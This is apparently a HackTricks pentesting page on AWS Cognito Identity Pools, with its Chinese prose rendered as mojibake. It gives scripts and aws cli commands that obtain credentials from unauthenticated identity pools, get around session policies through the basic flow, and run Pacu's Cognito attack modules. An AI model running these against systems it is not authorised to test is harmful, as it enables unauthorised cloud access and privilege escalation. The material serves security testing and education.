# Cognito Identity Pools

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

èº«ä»½æ± é€šè¿‡ä½¿ç”¨æˆ·èƒ½å¤Ÿ**è·å–ä¸´æ—¶å‡­è¯**ï¼Œåœ¨å…¶ä¸­å‘æŒ¥ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚è¿™äº›å‡­è¯å¯¹äºè®¿é—®å„ç§AWSæœåŠ¡è‡³å…³é‡è¦ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºAmazon S3å’ŒDynamoDBã€‚èº«ä»½æ± çš„ä¸€ä¸ªæ˜¾è‘—ç‰¹ç‚¹æ˜¯å®ƒä»¬æ”¯æŒåŒ¿åè®¿å®¢ç”¨æˆ·å’Œå¤šç§èº«ä»½æä¾›è€…è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚æ”¯æŒçš„èº«ä»½æä¾›è€…åŒ…æ‹¬ï¼š

* Amazon Cognitoç”¨æˆ·æ± 
* ç¤¾äº¤ç™»å½•é€‰é¡¹ï¼Œå¦‚Facebookã€Googleã€ä½¿ç”¨Amazonç™»å½•å’Œä½¿ç”¨Appleç™»å½•
* ç¬¦åˆOpenID Connect (OIDC)çš„æä¾›è€…
* SAMLï¼ˆå®‰å…¨å£°æ˜æ ‡è®°è¯­è¨€ï¼‰èº«ä»½æä¾›è€…
* å¼€å‘è€…è®¤è¯èº«ä»½
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

è¦ç”Ÿæˆèº«ä»½æ± ä¼šè¯ï¼Œæ‚¨é¦–å…ˆéœ€è¦**ç”Ÿæˆèº«ä»½ ID**ã€‚è¿™ä¸ªèº«ä»½ ID æ˜¯**è¯¥ç”¨æˆ·ä¼šè¯çš„æ ‡è¯†**ã€‚è¿™äº›æ ‡è¯†å¯ä»¥æœ‰å¤šè¾¾ 20 ä¸ªæ•°æ®é›†ï¼Œå¯ä»¥å­˜å‚¨å¤šè¾¾ 1MB çš„é”®å€¼å¯¹ã€‚

è¿™å¯¹äº**ä¿æŒç”¨æˆ·ä¿¡æ¯**ï¼ˆå°†å§‹ç»ˆä½¿ç”¨ç›¸åŒçš„èº«ä»½ IDï¼‰æ˜¯**æœ‰ç”¨çš„**ã€‚

æ­¤å¤–ï¼ŒæœåŠ¡**cognito-sync**æ˜¯å…è®¸**ç®¡ç†å’ŒåŒæ­¥è¿™äº›ä¿¡æ¯**ï¼ˆåœ¨æ•°æ®é›†ä¸­ï¼Œå‘é€æµä¸­çš„ä¿¡æ¯å’Œ SNS æ¶ˆæ¯ç­‰ï¼‰çš„æœåŠ¡ã€‚

### Tools for pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)ï¼ŒAWS åˆ©ç”¨æ¡†æ¶ï¼Œç°åœ¨åŒ…æ‹¬â€œcognito\_\_enumâ€å’Œâ€œcognito\_\_attackâ€æ¨¡å—ï¼Œè¿™äº›æ¨¡å—è‡ªåŠ¨æšä¸¾å¸æˆ·ä¸­çš„æ‰€æœ‰ Cognito èµ„äº§å¹¶æ ‡è®°å¼±é…ç½®ã€ç”¨äºè®¿é—®æ§åˆ¶çš„ç”¨æˆ·å±æ€§ç­‰ï¼ŒåŒæ—¶è¿˜è‡ªåŠ¨åˆ›å»ºç”¨æˆ·ï¼ˆåŒ…æ‹¬ MFA æ”¯æŒï¼‰å’ŒåŸºäºå¯ä¿®æ”¹è‡ªå®šä¹‰å±æ€§çš„æƒé™æå‡ã€å¯ç”¨çš„èº«ä»½æ± å‡­è¯ã€å¯å‡è®¾çš„è§’è‰²åœ¨ ID ä»¤ç‰Œä¸­ç­‰ã€‚

æœ‰å…³æ¨¡å—åŠŸèƒ½çš„æè¿°ï¼Œè¯·å‚è§[åšå®¢æ–‡ç« ](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)çš„ç¬¬ 2 éƒ¨åˆ†ã€‚æœ‰å…³å®‰è£…è¯´æ˜ï¼Œè¯·å‚è§ä¸» [Pacu](https://github.com/RhinoSecurityLabs/pacu) é¡µé¢ã€‚

#### Usage

ç¤ºä¾‹ cognito\_\_attack ç”¨æ³•ï¼Œå°è¯•åœ¨ç»™å®šèº«ä»½æ± å’Œç”¨æˆ·æ± å®¢æˆ·ç«¯ä¸Šåˆ›å»ºç”¨æˆ·å’Œæ‰€æœ‰æƒé™æå‡å‘é‡ï¼š
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
ç¤ºä¾‹ cognito\_\_enum ç”¨æ³•ï¼Œä»¥æ”¶é›†å½“å‰ AWS è´¦æˆ·ä¸­å¯è§çš„æ‰€æœ‰ç”¨æˆ·æ± ã€ç”¨æˆ·æ± å®¢æˆ·ç«¯ã€èº«ä»½æ± ã€ç”¨æˆ·ç­‰ï¼š
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) æ˜¯ä¸€ä¸ªç”¨ Python ç¼–å†™çš„ CLI å·¥å…·ï¼Œå®æ–½å¯¹ Cognito çš„ä¸åŒæ”»å‡»ï¼ŒåŒ…æ‹¬ä¸å¿…è¦çš„è´¦æˆ·åˆ›å»ºå’Œèº«ä»½æ± å‡çº§ã€‚

#### å®‰è£…
```bash
$ pip install cognito-scanner
```
#### ä½¿ç”¨
```bash
$ cognito-scanner --help
```
For more information check https://github.com/padok-team/cognito-scanner

## è®¿é—® IAM è§’è‰²

### æœªè®¤è¯

æ”»å‡»è€…éœ€è¦çŸ¥é“çš„å”¯ä¸€ä¿¡æ¯æ˜¯ **åœ¨ Cognito åº”ç”¨ä¸­è·å– AWS å‡­è¯** çš„ **èº«ä»½æ±  ID**ï¼Œå¹¶ä¸”è¿™ä¸ª **ID å¿…é¡»ç¡¬ç¼–ç ** åœ¨ web/mobile **åº”ç”¨ç¨‹åº** ä¸­ä»¥ä¾›ä½¿ç”¨ã€‚ä¸€ä¸ª ID çœ‹èµ·æ¥åƒè¿™æ ·ï¼š`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`ï¼ˆå®ƒæ— æ³•é€šè¿‡æš´åŠ›ç ´è§£è·å¾—ï¼‰ã€‚

{% hint style="success" %}
é€šè¿‡åˆ›å»ºçš„ **IAM Cognito æœªè®¤è¯è§’è‰²é»˜è®¤ç§°ä¸º** `Cognito_<Identity Pool name>Unauth_Role`
{% endhint %}

å¦‚æœä½ å‘ç°ä¸€ä¸ªç¡¬ç¼–ç çš„èº«ä»½æ±  ID å¹¶ä¸”å®ƒå…è®¸æœªè®¤è¯ç”¨æˆ·ï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å– AWS å‡­è¯ï¼š
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ **aws cli å‘½ä»¤**ï¼š
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæœªç»èº«ä»½éªŒè¯çš„ cognito **ç”¨æˆ·æ— æ³•æ‹¥æœ‰ä»»ä½•æƒé™ï¼Œå³ä½¿é€šè¿‡ç­–ç•¥åˆ†é…äº†æƒé™**ã€‚è¯·æŸ¥çœ‹ä»¥ä¸‹éƒ¨åˆ†ã€‚
{% endhint %}

### å¢å¼ºä¸åŸºæœ¬èº«ä»½éªŒè¯æµç¨‹

ä¸Šä¸€éƒ¨åˆ†éµå¾ªäº† **é»˜è®¤å¢å¼ºèº«ä»½éªŒè¯æµç¨‹**ã€‚æ­¤æµç¨‹ä¸ºç”Ÿæˆçš„ IAM è§’è‰²ä¼šè¯è®¾ç½®äº† **é™åˆ¶æ€§** [**ä¼šè¯ç­–ç•¥**](../../aws-basic-information/#session-policies)ã€‚è¯¥ç­–ç•¥ä»…å…è®¸ä¼šè¯ [**ä½¿ç”¨æ­¤åˆ—è¡¨ä¸­çš„æœåŠ¡**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)ï¼ˆå³ä½¿è¯¥è§’è‰²å¯ä»¥è®¿é—®å…¶ä»–æœåŠ¡ï¼‰ã€‚

ç„¶è€Œï¼Œå¦‚æœ **èº«ä»½æ± å¯ç”¨äº†â€œåŸºæœ¬ï¼ˆç»å…¸ï¼‰æµç¨‹â€**ï¼Œåˆ™æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æ­¤é™åˆ¶ï¼Œç”¨æˆ·å°†èƒ½å¤Ÿä½¿ç”¨è¯¥æµç¨‹è·å–ä¼šè¯ï¼Œè€Œè¯¥ä¼šè¯ **ä¸ä¼šæœ‰è¯¥é™åˆ¶æ€§ä¼šè¯ç­–ç•¥**ã€‚

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
å¦‚æœæ‚¨æ”¶åˆ°æ­¤**é”™è¯¯**ï¼Œåˆ™æ˜¯å› ä¸º**åŸºæœ¬æµç¨‹æœªå¯ç”¨ï¼ˆé»˜è®¤ï¼‰**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

æ‹¥æœ‰ä¸€ç»„IAMå‡­è¯åï¼Œæ‚¨åº”è¯¥æ£€æŸ¥[æ‚¨æ‹¥æœ‰çš„è®¿é—®æƒé™](../../#whoami)å¹¶å°è¯•[æå‡æƒé™](../../aws-privilege-escalation/)ã€‚

### å·²è®¤è¯

{% hint style="info" %}
è¯·è®°ä½ï¼Œ**å·²è®¤è¯ç”¨æˆ·**å¯èƒ½ä¼šè¢«æˆäºˆ**ä¸åŒçš„æƒé™**ï¼Œå› æ­¤å¦‚æœæ‚¨å¯ä»¥**åœ¨åº”ç”¨ç¨‹åºå†…æ³¨å†Œ**ï¼Œè¯·å°è¯•è¿™æ ·åšå¹¶è·å–æ–°å‡­è¯ã€‚
{% endhint %}

å¯¹äº**è®¿é—®èº«ä»½æ± çš„å·²è®¤è¯ç”¨æˆ·**ï¼Œå¯èƒ½è¿˜æœ‰**è§’è‰²**å¯ç”¨ã€‚

ä¸ºæ­¤ï¼Œæ‚¨å¯èƒ½éœ€è¦è®¿é—®**èº«ä»½æä¾›è€…**ã€‚å¦‚æœæ˜¯**Cognitoç”¨æˆ·æ± **ï¼Œä¹Ÿè®¸æ‚¨å¯ä»¥åˆ©ç”¨é»˜è®¤è¡Œä¸º**è‡ªå·±åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·**ã€‚

{% hint style="success" %}
é€šè¿‡åˆ›å»ºçš„**IAM Cognitoè®¤è¯è§’è‰²é»˜è®¤ç§°ä¸º** `Cognito_<Identity Pool name>Auth_Role`
{% endhint %}

æ— è®ºå¦‚ä½•ï¼Œ**ä»¥ä¸‹ç¤ºä¾‹**å‡è®¾æ‚¨å·²ç»ç™»å½•åˆ°ç”¨äºè®¿é—®èº«ä»½æ± çš„**Cognitoç”¨æˆ·æ± **ï¼ˆä¸è¦å¿˜è®°å…¶ä»–ç±»å‹çš„èº«ä»½æä¾›è€…ä¹Ÿå¯ä»¥è¢«é…ç½®ï¼‰ã€‚

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# ä»ä¸Šä¸€ä¸ªå‘½ä»¤å“åº”ä¸­è·å–identity_id
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# åœ¨IdTokenä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç”¨æˆ·å› ç”¨æˆ·æ± ç»„è€Œæ‹¥æœ‰çš„è§’è‰²
# ä½¿ç”¨ --custom-role-arn è·å–ç‰¹å®šè§’è‰²çš„å‡­è¯
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
å¯ä»¥**æ ¹æ®ç”¨æˆ·ç™»å½•çš„èº«ä»½æä¾›è€…**æˆ–**ç”¨æˆ·**ï¼ˆä½¿ç”¨å£°æ˜ï¼‰é…ç½®ä¸åŒçš„IAMè§’è‰²ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨é€šè¿‡ç›¸åŒæˆ–ä¸åŒçš„æä¾›è€…è®¿é—®ä¸åŒçš„ç”¨æˆ·ï¼Œ**ç™»å½•å¹¶è®¿é—®æ‰€æœ‰ç”¨æˆ·çš„IAMè§’è‰²å¯èƒ½æ˜¯å€¼å¾—çš„**ã€‚
{% endhint %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
